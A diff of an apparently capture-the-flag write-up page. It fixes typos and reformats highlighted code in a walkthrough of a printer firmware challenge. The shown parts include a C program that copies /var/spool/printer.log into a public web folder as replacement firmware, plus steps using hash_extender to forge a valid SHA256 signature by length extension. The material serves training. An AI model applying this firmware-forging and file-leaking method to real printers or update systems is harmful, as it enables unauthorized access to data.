@@ -40,7 +40,6 @@
     <script src="static/jquery.js"></script>
     <script src="static/underscore.js"></script>
     <script src="static/doctools.js"></script>
-    <script src="static/language_data.js"></script>
     <script src="static/togglebutton.js"></script>
     <script src="static/clipboard.min.js"></script>
     <script src="static/copybutton.js"></script>
@@ -445,7 +444,7 @@
 <p>To complete this challenge we have to read the contents of /var/spool/printer.log</p>
 <div class="admonition tip">
 <p class="admonition-title">Tip</p>
-<p>To complete this particular challenge a linux computer is very useful.</p>
+<p>To complete this particular challenge a Linux computer is very useful.</p>
 </div>
 <p>First of all, let’s explore the website of this challenge, https://printer.kringlecastle.com <br>
 There are four tabs on the left. The <strong>Firmware Update</strong> one is pretty interesting</p>
@@ -458,7 +457,7 @@ The file we download is called <code class="docutils literal notranslate"><span 
 </div>
 <p>There are 4 fields:</p>
 <ol class="simple">
-<li><p><strong>firmware:</strong> this a a very long string probably base64-encoded. Strange, we were expecting a file, but a string can’t be file. <strong>Or can it?!</strong>  We’ll see that in a moment.</p></li>
+<li><p><strong>firmware:</strong> this a a very long string probably base64-encoded. Strange, we were expecting a file, but a string can’t be a file. <strong>Or can it?!</strong>  We’ll see that in a moment.</p></li>
 <li><p><strong>signature:</strong> this is the hash of the firmware. A security measure.</p></li>
 <li><p><strong>secret lenght:</strong> the lenght of the secret used to hash. We’ll need this later</p></li>
 <li><p><strong>algorithm:</strong> well…now we know that the hash is a <strong>SHA256</strong>. We’ll also need this later</p></li>
@@ -474,7 +473,7 @@ The file we download is called <code class="docutils literal notranslate"><span 
 <div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ base64 -d original_firmware.b64 &gt; original_firmware
 </pre></div>
 </div>
-<p>Now, if we try to print the contents of the decoded file with <code class="docutils literal notranslate"><span class="pre">cat</span></code> we see some strange characters, which mean that this is a binary file, and cannot be printed. <br>
+<p>Now, if we try to print the contents of the decoded file with <code class="docutils literal notranslate"><span class="pre">cat</span></code> we see some strange characters, which means that this is a binary file, and cannot be printed. <br>
 We can try to use <code class="docutils literal notranslate"><span class="pre">file</span></code> to see the file type</p>
 <div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ file original_firmware
 
@@ -509,7 +508,7 @@ We can try to use the <strong>Magic</strong> (that’s the actual name!) operati
 </ul>
 <p>In the output we can see that the <strong>Magic</strong> function suggests to <strong>Unzip</strong> it. Click on unzip. <br>
 <br>
-Yes! We found the actual <em>firmware executable</em>. As I said during the linux method, since it is compiled, we can’t just read it, or decompile it, but we may be able to <em>replace</em> it!</p>
+Yes! We found the actual <em>firmware executable</em>. As I said during the Linux method, since it is compiled, we can’t just read it, or decompile it, but we may be able to <em>replace</em> it!</p>
 </div>
 </div>
 <div class="section" id="firmare-edit-it">
@@ -518,41 +517,41 @@ Yes! We found the actual <em>firmware executable</em>. As I said during the linu
 <br>
 We wrote a program in C, but you could do the same thing with a simple bash script as well. <br></p>
 <p>This is the code</p>
-<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span><span class="w"></span>
-<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">source_file</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/var/spool/printer.log&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="w">   </span><span class="c1">//usjhsyehdgsttey53 is a random string which we used as the copied file name</span>
-<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">target_file</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/app/lib/public/incoming/usjhsyehdgsttey53&quot;</span><span class="p">;</span><span class="w"></span>
-<span class="w">   </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="p">;</span><span class="w"></span>
-
-
-<span class="w">   </span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">source_file</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="w"></span>
-
-<span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
-<span class="w">   </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="p">}</span><span class="w"></span>
-
-<span class="w">   </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">target_file</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">);</span><span class="w"></span>
-
-<span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
-<span class="w">   </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="p">}</span><span class="w"></span>
-
-<span class="w">   </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fgetc</span><span class="p">(</span><span class="n">source</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EOF</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
-<span class="w">      </span><span class="n">fputc</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="w"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+   <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">source_file</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/var/spool/printer.log&quot;</span><span class="p">;</span>
+   <span class="c1">//usjhsyehdgsttey53 is a random string which we used as the copied file name</span>
+   <span class="kt">char</span> <span class="n">target_file</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/app/lib/public/incoming/usjhsyehdgsttey53&quot;</span><span class="p">;</span>
+   <span class="kt">FILE</span> <span class="o">*</span><span class="n">source</span><span class="p">,</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
 
 
-<span class="w">   </span><span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="n">fclose</span><span class="p">(</span><span class="n">target</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+   <span class="n">source</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">source_file</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+
+   <span class="k">if</span><span class="p">(</span> <span class="n">source</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="p">)</span>
+   <span class="p">{</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+   <span class="p">}</span>
+
+   <span class="n">target</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">target_file</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
+
+   <span class="k">if</span><span class="p">(</span> <span class="n">target</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="p">)</span>
+   <span class="p">{</span>
+      <span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+   <span class="p">}</span>
+
+   <span class="k">while</span><span class="p">(</span> <span class="p">(</span> <span class="n">ch</span> <span class="o">=</span> <span class="n">fgetc</span><span class="p">(</span><span class="n">source</span><span class="p">)</span> <span class="p">)</span> <span class="o">!=</span> <span class="n">EOF</span> <span class="p">)</span>
+      <span class="n">fputc</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+
+
+   <span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span>
+   <span class="n">fclose</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 </div>
 <p>Now build this code using <code class="docutils literal notranslate"><span class="pre">gcc</span></code></p>
@@ -581,7 +580,7 @@ $ <span class="nb">cd</span> hash_extender
 $ make
 </pre></div>
 </div>
-<p>We now have an executable called <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code>. To work in a more ordered envirnment, you should copy it into the same directory of the two zipfiles.</p>
+<p>We now have an executable called <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code>. To work in a more ordered environment, you should copy it into the same directory of the two zipfiles.</p>
 <p>Now that <strong>hash_extender</strong> is ready to work, we can start the hijacking process. This is what you will need.</p>
 <ol class="simple">
 <li><p>hash_extender script</p></li>
@@ -589,8 +588,8 @@ $ make
 <li><p>Edited zipfile</p></li>
 <li><p>Original <code class="docutils literal notranslate"><span class="pre">firmware-export.json</span></code> file</p></li>
 </ol>
-<p>Hash Extender can be used to append a new string (or file!) to the original one. It is able to process the original signature, and generature a new one, which is still valid, even with our modified file appended! <br>
-We are very lucky, because the troll said the the printer only processes the last file inserted if more files in the same format are provided. It’s perfect for our append!</p>
+<p>Hash Extender can be used to append a new string (or file!) to the original one. It is able to process the original signature, and to generate a new one, which is still valid, even with our modified file appended! <br>
+We are very lucky, because the troll said that the printer only processes the last file inserted if more files in the same format are provided. It’s perfect for our append!</p>
 <p>Run <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code> with these parameters</p>
 <ul class="simple">
 <li><p><strong>–file firmware.zip</strong> | This is the original firmware.zip</p></li>
@@ -602,7 +601,7 @@ We are very lucky, because the troll said the the printer only processes the las
 </ul>
 <div class="admonition-a-little-fun-fact admonition">
 <p class="admonition-title">A Little Fun Fact</p>
-<p>When we starded this challenge in the morning, the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument didn’t exist! You could only append strings. We had to convert to hex, print and run the command for every attempt. In the evening, while we were trying to add our personal <code class="docutils literal notranslate"><span class="pre">--append-file</span></code> argument, we checked the git of the tool again, and the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument was already there! Someone updated the code a few hours after we originally downloaded it :) <br>
+<p>When we started this challenge in the morning, the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument didn’t exist! You could only append strings. We had to convert to hex, print and run the command for every attempt. In the evening, while we were trying to add our personal <code class="docutils literal notranslate"><span class="pre">--append-file</span></code> argument, we checked the git of the tool again, and the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument was already there! Someone updated the code a few hours after we originally downloaded it :) <br>
 Now, back to the challenge!</p>
 </div>
 <p>Let’s do this.</p>
